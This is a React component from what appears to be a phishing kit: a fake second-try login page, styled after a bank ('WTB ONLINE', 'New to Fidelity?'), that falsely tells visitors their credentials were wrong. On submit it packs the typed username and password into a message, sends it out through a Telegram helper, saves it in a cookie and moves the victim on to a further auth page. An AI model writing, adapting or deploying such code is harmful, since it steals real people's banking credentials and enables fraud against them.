import React from "react";
import Logo from "../assets/logo.jpeg";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Login2() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<Login2>({
    username2: "",
    password2: "",
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const message = `
        ---- WTB ONLINE (SECOND TRY) -----
        Username: ${formInput.username2}
        Password: ${formInput.password2}
        `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("login2", formInput);
    setIsLoading(false);
    navigate("../login/auth", { replace: true });
  }

  return (
    <>
      <div className="content">
        <div className="form">
          <form onSubmit={handleSubmit} method="POST">
            <div className="form-item">
              <div className="brand">
                <img src={Logo} alt="" />
              </div>
              <p
                style={{
                  color: "red",
                  border: "thin solid red",
                  padding: 10,
                  
                  fontSize: 15,
                }}
              >
                You've entered an incorrect username or password. Please try
                again.
              </p>
              <div className="form-field">
                <input
                  onChange={handleInputChange}
                  name="username2"
                  type="text"
                  placeholder="Username"
                />
              </div>

              <div className="form-field">
                <input
                  onChange={handleInputChange}
                  type="password"
                  name="password2"
                  placeholder="Password"
                />
              </div>

              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  marginTop: "-20px",
                }}
              >
                <p className="btn-theme-color bold reduce-text">
                  First time user? Enroll now.
                </p>
                {isLoading ? (
                  <div className="form-field">
                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
                  </div>
                ) : (
                  <div className="form-field">
                    <button style={{ width: 120, height: 50 }} type="submit">
                      Continue
                    </button>
                  </div>
                )}
              </div>
            </div>
          </form>
        </div>
      </div>

      <div className="footer">
        <p style={{ textAlign: "center" }}>
          New to Fidelity? <a href="">Open an account</a> or{" "}
          <a href="">sign up</a>
        </p>
      </div>
    </>
  );
}
